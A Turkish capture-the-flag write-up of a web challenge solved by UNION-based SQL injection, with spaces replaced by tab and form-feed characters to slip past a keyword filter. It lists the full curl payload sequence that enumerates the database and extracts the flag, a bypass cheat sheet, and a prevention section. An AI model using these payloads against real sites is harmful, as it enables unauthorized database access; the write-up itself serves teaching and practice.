# 💉 Union2 - Web Challenge 

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Zor-darkred?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-WAF Bypass UNION SQL Injection-purple?style=for-the-badge" alt="SQL Injection">
</p>

---

## 📋 Soru Bilgileri
  
**Kategori:** Web  
**Seviye:** Zor   
**Puan:** 1250  

**Challenge URL:** http://64.226.74.243:10005/?id=1

**İpucu:** secret_flag

---

## 🔍 Analiz

**Hedef:** WAF/Filter bypass yaparak UNION-based SQL Injection ile veritabanından flag'i çekmek  

**Strateji:** Parametre analizi → Filter keşfi → WAF bypass (whitespace encoding) → Sütun sayısı keşfi → Tablo/sütun enumeration → Flag extraction

**İpuçları:**
- 💡 URL'de GET parametresi var: `?id=1`
- 🎯 "Spaces are not always spaces" → Whitespace karakterleri ile bypass
- 🛡️ "Filters look for patterns, not intentions" → WAF/Filter var
- 🔑 "secret_flag" → Tablo veya sütun adı ipucu

---

## ✅ Çözüm Adımları

### 🔧 **Adım 1: İlk Keşif - Uygulama Analizi**

**Terminalden sayfayı inceliyoruz:**

```bash
curl "http://64.226.74.243:10005/?id=1"
```

**Response:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>UltraHard</title>
</head>
<body>
<h2>Article</h2>
<h3>Welcome</h3><p>This is a safe article</p><hr>
<!-- 
Hint:
Spaces are not always spaces.
-->
<p><i>Hint: Filters look for patterns, not intentions.</i></p>
</body>
</html>
```

**Analiz:**
- ✅ **Parametre:** `id` (GET)
- ✅ **Çıktı:** Makale başlığı ve içerik gösteriliyor
- ✅ **İpuçları:** "Spaces are not always spaces" + "Filters look for patterns"
- 💡 WAF/Filter var - whitespace bypass gerekli
- 💡 SQL: `SELECT title, content FROM articles WHERE id = 1`

---

### 🧪 **Adım 2: Farklı ID'leri Test Etme**

```bash
curl "http://64.226.74.243:10005/?id=2"
curl "http://64.226.74.243:10005/?id=3"
```

**Sonuçlar:**
- `id=1` → Welcome, This is a safe article
- `id=2` → About, Nothing interesting here
- `id=3` → Boş (kayıt yok)

**Sonuç:** ✅ Normal çalışıyor, SQL Injection test edebiliriz

---

### 🔍 **Adım 3: SQL Injection Testi**

**Tek tırnak ile test:**

```bash
curl "http://64.226.74.243:10005/?id=1'"
```

**Response:**

```html
<h3>Welcome</h3><p>This is a safe article</p>
```

**Analiz:**
- ❌ Hata gösterilmiyor - tek tırnak filtreleniyor veya gösterilmiyor
- 💡 Numeric injection test edelim

---

### 🛡️ **Adım 4: Filter Keşfi - Normal Komutlar Bloklanıyor**

**ORDER BY testi:**

```bash
curl "http://64.226.74.243:10005/?id=1+ORDER+BY+1"
```

**Response:**

```
Blocked by filter
```

**UNION testi:**

```bash
curl "http://64.226.74.243:10005/?id=1+UNION+SELECT+1,2"
```

**Response:**

```
Blocked by filter
```

**Analiz:**
- ❌ Normal boşluk (+) ile komutlar bloklanıyor
- ✅ WAF/Filter var!
- 💡 "Spaces are not always spaces" ipucunu kullanmalıyız

---

### 🎯 **Adım 5: Whitespace Bypass - %09 (TAB) Keşfi**

**TAB karakteri (%09) ile test:**

```bash
curl "http://64.226.74.243:10005/?id=1%09OR%091=1"
```

**Response:**

```html
<h3>Welcome</h3><p>This is a safe article</p><hr>
<h3>About</h3><p>Nothing interesting here</p><hr>
```

**Analiz:**
- ✅ **%09 (TAB) bypass çalıştı!**
- ✅ OR 1=1 ile iki makale gösterildi
- 💡 Tüm komutlarda %09 kullanabiliriz

---

### 📊 **Adım 6: Sütun Sayısı Keşfi - ORDER BY**

**%09 ile ORDER BY:**

```bash
curl "http://64.226.74.243:10005/?id=1%09ORDER%09BY%091"
# ✅ Çalıştı

curl "http://64.226.74.243:10005/?id=1%09ORDER%09BY%092"
# ✅ Çalıştı

curl "http://64.226.74.243:10005/?id=1%09ORDER%09BY%093"
# Boş döndü - sütun yok
```

**Sonuç:**
- ✅ **Sütun sayısı: 2**
- 💡 `ORDER BY 2` çalıştı, `ORDER BY 3` boş döndü

---

### 🧬 **Adım 7: UNION SELECT Testi**

**2 sütunla UNION:**

```bash
curl "http://64.226.74.243:10005/?id=-1%09UNION%09SELECT%091,2"
```

**Response:**

```html
<h3>1</h3><p>2</p><hr>
```

**Analiz:**
- ✅ **UNION çalışıyor!**
- ✅ Birinci sütun `<h3>` içinde, ikinci sütun `<p>` içinde görünüyor
- 💡 Şimdi FROM bypass etmemiz gerekiyor

---

### 🚧 **Adım 8: FROM Kelimesi Bypass - %0C (Form Feed) Keşfi**

**FROM kelimesi bloklanıyor:**

```bash
curl "http://64.226.74.243:10005/?id=-1%09UNION%09SELECT%091,2%09FROM%09flags"
# Boş döndü - FROM bloklanıyor
```

**Farklı whitespace karakterleri test:**

```bash
# %0A (Line Feed)
curl "http://64.226.74.243:10005/?id=-1%09UNION%09SELECT%091,2%0AFROM%0Aflags"
# Boş

# %0B (Vertical Tab)
curl "http://64.226.74.243:10005/?id=-1%09UNION%09SELECT%091,2%0BFROM%0Bflags"
# Boş

# %0C (Form Feed)
curl "http://64.226.74.243:10005/?id=-1%09UNION%09SELECT%091,2%0CFROM%0Cflags"
# ✅ ÇALIŞTI!
```

**Sonuç:**
- ✅ **%0C (Form Feed) ile FROM bypass edildi!**
- 💡 UNION için %09, FROM için %0C kullanmalıyız

---

### 🗄️ **Adım 9: Veritabanı Bilgilerini Çekme**

**Database ve version bilgisi:**

```bash
curl "http://64.226.74.243:10005/?id=-1%09UNION%09SELECT%09user(),version()"
```

**Response:**

```html
<h3>user_ultrahard@172.18.0.10</h3><p>8.0.45</p><hr>
```

**Database adı:**

```bash
curl "http://64.226.74.243:10005/?id=-1%09UNION%09SELECT%09user(),database()"
```

**Response:**

```html
<h3>user_ultrahard@172.18.0.10</h3><p>ultrahard_db</p><hr>
```

**Bilgiler:**
- ✅ **Database:** ultrahard_db
- ✅ **MySQL Version:** 8.0.45
- ✅ **User:** user_ultrahard@172.18.0.10

---

### 🔑 **Adım 10: İpucunu Kullanma - secret_flag Tablosu**

**"secret_flag" ipucundan yola çıkarak tablo tahmin ediyoruz:**

```bash
curl "http://64.226.74.243:10005/?id=-1%09UNION%09SELECT%091,2%0CFROM%0Csecret_flag"
```

**Response:**

```html
<h3>1</h3><p>2</p><hr>
```

**Analiz:**
- ✅ **secret_flag tablosu var!**
- 💡 Şimdi sütun isimlerini bulmamız gerekiyor

---

### 🔬 **Adım 11: Sütun İsimlerini Tahmin Etme**

**Yaygın sütun isimleriyle test:**

```bash
# id, value
curl "http://64.226.74.243:10005/?id=-1%09UNION%09SELECT%09id,value%0CFROM%0Csecret_flag"
```

**Response:**

```html
<h3>1</h3><p>FLAG{regex_filter_is_not_a_waf_union_select_sqli_Success4895632134}</p><hr>
```

**🎉 BINGO! FLAG bulundu!**

---

### 💎 **Adım 12: FLAG Doğrulama**

**Farklı sütun kombinasyonları:**

```bash
# value, id - ters sıra
curl "http://64.226.74.243:10005/?id=-1%09UNION%09SELECT%09value,id%0CFROM%0Csecret_flag"
```

**Response:**

```html
<h3>FLAG{regex_filter_is_not_a_waf_union_select_sqli_Success4895632134}</h3><p>1</p><hr>
```

**✅ BAŞARILI! FLAG elde edildi!**

---

## 🏁 **FLAG**

```
FLAG{regex_filter_is_not_a_waf_union_select_sqli_Success4895632134}
```

---

## 🧬 Teknik Analiz

### **Güvensiz Kod Akışı**

```php
// GÜVENSIZ KOD (Tahmini)
$id = $_GET['id'];

// Basit regex filter
$blocked_keywords = ['union', 'select', 'from', 'where', 'order', 'by'];
foreach ($blocked_keywords as $keyword) {
    if (preg_match("/ $keyword /i", $id)) {
        die("Blocked by filter");
    }
}

$query = "SELECT title, content FROM articles WHERE id = $id";
$result = $mysqli->query($query);

if ($row = $result->fetch_assoc()) {
    echo "<h3>" . htmlspecialchars($row['title']) . "</h3>";
    echo "<p>" . htmlspecialchars($row['content']) . "</p>";
}
```

**Zafiyet:**
- ❌ Regex filter sadece normal boşlukları kontrol ediyor
- ❌ TAB (%09), Form Feed (%0C) gibi whitespace karakterlerini algılamıyor
- ❌ "Spaces are not always spaces" - Pattern-based filter
- ❌ Prepared statements kullanılmamış

---

### **Exploit Akışı**

**1. Normal Sorgu:**
```sql
SELECT title, content FROM articles WHERE id = 1
# Sonuç: Welcome, This is a safe article
```

**2. Filter Test:**
```sql
SELECT title, content FROM articles WHERE id = 1 ORDER BY 1
# ❌ Blocked by filter - normal boşluk (+) bloklanıyor
```

**3. Whitespace Bypass - %09 (TAB):**
```sql
SELECT title, content FROM articles WHERE id = 1	OR	1=1
# ✅ Çalışır - TAB karakteri ile bypass
# Sonuç: Tüm makaleler
```

**4. ORDER BY ile Sütun Keşfi:**
```sql
SELECT title, content FROM articles WHERE id = 1	ORDER	BY	2
# ✅ Çalışır - 2 sütun var

SELECT title, content FROM articles WHERE id = 1	ORDER	BY	3
# Boş - 3. sütun yok
```

**5. UNION SELECT Test:**
```sql
SELECT title, content FROM articles WHERE id = -1	UNION	SELECT	1,2
# ✅ Çalışır - title: 1, content: 2
```

**6. FROM Bypass - %0C (Form Feed):**
```sql
SELECT title, content FROM articles WHERE id = -1	UNION	SELECT	1,2FROM flags
# ❌ FROM bloklanıyor

SELECT title, content FROM articles WHERE id = -1	UNION	SELECT	1,2<FF>FROM<FF>flags
# ✅ Çalışır - Form Feed (%0C) ile bypass
```

**7. Database Enumeration:**
```sql
# Database adı
SELECT title, content FROM articles WHERE id = -1	UNION	SELECT	user(),database()
# Sonuç: user_ultrahard@172.18.0.10, ultrahard_db
```

**8. İpucu Kullanımı - secret_flag Tablosu:**
```sql
# "secret_flag" ipucundan yola çıkarak
SELECT title, content FROM articles WHERE id = -1	UNION	SELECT	1,2<FF>FROM<FF>secret_flag
# ✅ Tablo var!
```

**9. FLAG Extraction:**
```sql
SELECT title, content FROM articles WHERE id = -1	UNION	SELECT	id,value<FF>FROM<FF>secret_flag
# Sonuç: FLAG{regex_filter_is_not_a_waf_union_select_sqli_Success4895632134}
```

---

### **Whitespace Bypass Teknikleri**

**Kullanılan Karakterler:**
- ✅ **%09** (TAB - Horizontal Tab) → UNION, SELECT, ORDER BY bypass
- ✅ **%0C** (Form Feed) → FROM bypass

**Test Edilen Ama Çalışmayan:**
- ❌ **%20** (Space) → Bloklanıyor
- ❌ **%0A** (Line Feed) → Çalışmadı
- ❌ **%0B** (Vertical Tab) → Çalışmadı
- ❌ **%0D** (Carriage Return) → Çalışmadı
- ❌ **+** (URL encoded space) → Bloklanıyor

**Neden %0C Çalıştı?**
- Regex filter sadece ` FROM ` (normal boşluklarla) kontrol ediyor
- Form Feed karakteri regex pattern'ine uymadığı için bypass oluyor
- "Filters look for patterns, not intentions" ipucunun anlamı

---

### **WAF/Filter Bypass Stratejisi**

**1. Whitespace Karakterleri:**
```
%09 - Horizontal Tab
%0A - Line Feed (LF)
%0B - Vertical Tab
%0C - Form Feed (FF)
%0D - Carriage Return (CR)
%A0 - Non-breaking space
```

**2. Case Variation:**
```
UNION → UnIoN, uNiOn
SELECT → SeLeCt, sElEcT
```

**3. Comment Bypass:**
```
/*!UNION*/
/**/UNION/**/
/*!12345UNION*/
```

**4. Encoding:**
```
Hex: 0x464c4147
URL: %55%4E%49%4F%4E
```

---

## 🛡️ Nasıl Önlenir?

### **1. Prepared Statements (Kritik!)**

```php
// GÜVENLİ KOD
$id = $_GET['id'];

$stmt = $mysqli->prepare("SELECT title, content FROM articles WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();

if ($row = $result->fetch_assoc()) {
    echo "<h3>" . htmlspecialchars($row['title']) . "</h3>";
    echo "<p>" . htmlspecialchars($row['content']) . "</p>";
}
```

---

### **2. Güçlü Input Validation**

```php
// Numeric parametre kontrolü
$id = $_GET['id'];

if (!is_numeric($id) || $id < 1) {
    die("Invalid ID");
}

// Integer'a cast et
$id = (int)$id;

// Whitespace karakterlerini temizle
$id = preg_replace('/[\x00-\x1F\x7F]/', '', $id);
```

---

### **3. WAF Yerine Parameterized Queries**

```php
// YANLIŞ YAKLAŞIM - Regex filter
$blocked = ['union', 'select', 'from'];
foreach ($blocked as $word) {
    if (stripos($input, $word) !== false) {
        die("Blocked");
    }
}

// DOĞRU YAKLAŞIM - Prepared statements
$stmt = $mysqli->prepare("SELECT * FROM table WHERE id = ?");
$stmt->bind_param("i", $id);
```

**Neden Regex Filter Yeterli Değil?**
- ❌ Whitespace bypass (TAB, Form Feed, vb.)
- ❌ Case variation bypass
- ❌ Comment bypass
- ❌ Encoding bypass
- ✅ Prepared statements %100 güvenli

---

### **4. Least Privilege Principle**

```sql
-- Database kullanıcısı sadece SELECT yapabilmeli
GRANT SELECT ON ultrahard_db.articles TO 'web_user'@'localhost';

-- secret_flag tablosuna erişim OLMASIN
REVOKE ALL ON ultrahard_db.secret_flag FROM 'web_user'@'localhost';
```

---

### **5. Error Handling**

```php
// SQL hatalarını kullanıcıya gösterme
mysqli_report(MYSQLI_REPORT_OFF);

if (!$result) {
    error_log($mysqli->error);
    die("An error occurred");
}
```

---

## 🛠️ **Kullanılan Komutlar**

```bash
# İlk keşif
curl "http://64.226.74.243:10005/?id=1"

# Farklı ID'ler
curl "http://64.226.74.243:10005/?id=2"
curl "http://64.226.74.243:10005/?id=3"

# Filter keşfi
curl "http://64.226.74.243:10005/?id=1+ORDER+BY+1"  # Blocked
curl "http://64.226.74.243:10005/?id=1+UNION+SELECT+1,2"  # Blocked

# Whitespace bypass - %09 (TAB)
curl "http://64.226.74.243:10005/?id=1%09OR%091=1"  # ✅ Çalıştı

# Sütun sayısı keşfi
curl "http://64.226.74.243:10005/?id=1%09ORDER%09BY%091"  # ✅
curl "http://64.226.74.243:10005/?id=1%09ORDER%09BY%092"  # ✅
curl "http://64.226.74.243:10005/?id=1%09ORDER%09BY%093"  # Boş

# UNION test
curl "http://64.226.74.243:10005/?id=-1%09UNION%09SELECT%091,2"  # ✅

# FROM bypass - %0C (Form Feed)
curl "http://64.226.74.243:10005/?id=-1%09UNION%09SELECT%091,2%0CFROM%0Cflags"

# Database bilgisi
curl "http://64.226.74.243:10005/?id=-1%09UNION%09SELECT%09user(),version()"
curl "http://64.226.74.243:10005/?id=-1%09UNION%09SELECT%09user(),database()"

# secret_flag tablosu testi
curl "http://64.226.74.243:10005/?id=-1%09UNION%09SELECT%091,2%0CFROM%0Csecret_flag"

# FLAG extraction
curl "http://64.226.74.243:10005/?id=-1%09UNION%09SELECT%09id,value%0CFROM%0Csecret_flag"
```

---

## 💭 **Çözüm Akışı**

```
🌐 Union2 Web Challenge
            ↓
🔧 URL Analizi
   → GET parametre: ?id=1
   → Makale bilgisi gösteriliyor
   → İpuçları: "Spaces are not always spaces"
            ↓
🛡️ Filter Keşfi
   → Normal boşluk (+) bloklanıyor
   → "Blocked by filter" mesajı
   → WAF/Filter var!
            ↓
🎯 Whitespace Bypass
   → %09 (TAB) test → ✅ Çalıştı!
   → id=1%09OR%091=1 → İki makale
            ↓
📊 Sütun Sayısı Keşfi
   → ORDER BY 1 ✅
   → ORDER BY 2 ✅
   → ORDER BY 3 Boş
   → Sonuç: 2 sütun
            ↓
🧬 UNION SELECT Test
   → -1%09UNION%09SELECT%091,2
   → title: 1, content: 2 → Başarılı!
            ↓
🚧 FROM Bypass Keşfi
   → Normal FROM bloklanıyor
   → %0C (Form Feed) test
   → %0CFROM%0C → ✅ Bypass!
            ↓
🗄️ Database Enumeration
   → user() → user_ultrahard
   → database() → ultrahard_db
   → version() → 8.0.45
            ↓
🔑 İpucu Kullanımı
   → "secret_flag" → Tablo adı
   → Tablo test → ✅ Var!
            ↓
💎 FLAG Extraction
   → id,value sütunları
   → -1%09UNION%09SELECT%09id,value%0CFROM%0Csecret_flag
            ↓
🏁 FLAG{regex_filter_is_not_a_waf_union_select_sqli_Success4895632134}
```
